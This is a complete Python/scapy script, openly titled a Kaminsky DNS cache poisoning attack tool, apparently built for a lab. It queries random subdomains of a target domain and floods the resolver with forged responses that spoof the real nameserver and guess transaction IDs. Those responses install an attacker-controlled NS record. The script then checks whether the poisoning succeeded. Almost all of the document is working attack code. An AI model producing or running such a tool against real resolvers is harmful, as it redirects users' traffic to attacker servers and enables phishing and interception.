#!/usr/bin/env python3
import random
import argparse
import threading
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1

# --- Worker function for sending a single spoofed packet ---
def send_spoofed_response(resolver_ip, real_ns_ip, target_domain, specific_subdomain, attacker_ip, fake_ns_domain, txn_id):
    """Crafts and sends one spoofed DNS response packet for a specific subdomain."""
    spoofed_response = IP(src=real_ns_ip, dst=resolver_ip) / \
                       UDP(sport=53, dport=5000) / \
                       DNS(
                           id=txn_id,
                           qr=1, aa=1,
                           qd=DNSQR(qname=specific_subdomain),  # Use the specific subdomain
                           an=DNSRR(rrname=specific_subdomain, ttl=86400, rdata=attacker_ip),  # Use the specific subdomain
                           ns=DNSRR(rrname=target_domain, type='NS', ttl=86400, rdata=fake_ns_domain),
                           ar=DNSRR(rrname=fake_ns_domain, ttl=86400, rdata=attacker_ip)
                       )
    send(spoofed_response, verbose=0)

def run_attack(resolver_ip, attacker_ip, real_ns_ip, target_domain, num_requests, num_responses):
    fake_ns_domain = "ns.attacker-lab.com"
    
    for request_num in range(num_requests):
        # Generate unique subdomain for this request
        specific_subdomain = str(random.randint(10000, 99999)) + "." + target_domain
        print(f"[*]   Request #{request_num + 1}: Using subdomain {specific_subdomain}")
        
        # Send query for this specific subdomain
        query_packet = IP(dst=resolver_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=specific_subdomain))
        send(query_packet, verbose=0)

        txn_ids = random.sample(range(1, 65536), num_responses) 

        # --- Multithreaded Flood ---
        print(f"[*]   Flooding with {num_responses} spoofed responses using threads...")
        threads = []
        for txn_id in txn_ids:
            # Create a thread for each packet
            thread = threading.Thread(
                target=send_spoofed_response,
                args=(resolver_ip, real_ns_ip, target_domain, specific_subdomain, attacker_ip, fake_ns_domain, txn_id)
            )
            threads.append(thread)
            thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

def verify_attack(resolver_ip, target_domain, attacker_ip):
    """
    Checks if the cache poisoning was successful by querying the resolver.
    Returns True on success, False on failure.
    """
    print("[*]   Verifying attack...")
    try:
        query = IP(dst=resolver_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=target_domain))
        response = sr1(query, timeout=2, verbose=0)

        if response and response.haslayer(DNSRR) and response[DNSRR].rdata == attacker_ip:
            return True
    except Exception as e:
        print(f"[-]   Verification error: {e}")
    
    return False

def main():
    parser = argparse.ArgumentParser(description="Kaminsky DNS Cache Poisoning Attack Tool (Multithreaded)")
    parser.add_argument("--resolver", default="192.168.100.10", help="IP of the target DNS resolver.")
    parser.add_argument("--attacker-ip", default="10.0.2.15", help="IP of the attacker's machine.")
    parser.add_argument("--real-ns", default="8.8.8.8", help="IP of the real nameserver to impersonate.")
    parser.add_argument("--domain", default="my-lab-bank.com", help="The target domain to poison.")
    parser.add_argument("--tries", type=int, default=10, help="Number of attack attempts to make.")
    parser.add_argument("--requests", type=int, default=50, help="Number of initial DNS queries to send per try.")
    parser.add_argument("--responses", type=int, default=500, help="Number of spoofed responses to send per try.")
    args = parser.parse_args()

    print("\n--- DNS Cache Poisoning Attack Starting ---")
    print(f"[+] Target Domain: {args.domain}")
    print(f"[+] Target Resolver: {args.resolver}")
    print("-------------------------------------------\n")

    for i in range(args.tries):
        print(f"[*] --- Attempt #{i + 1} of {args.tries} ---")
        run_attack(args.resolver, args.attacker_ip, args.real_ns, args.domain, args.requests, args.responses)
        
        if verify_attack(args.resolver, args.domain, args.attacker_ip):
            print("\n[SUCCESS] DNS cache successfully poisoned!")
            print(f"[RESULT]  {args.domain} now points to {args.attacker_ip}")
            return
        else:
            print("[-]   Attack failed on this attempt. Trying again...\n")

    print("\n[FAILURE] All attack attempts failed. The DNS cache was not poisoned.")

if __name__ == "__main__":
    main()
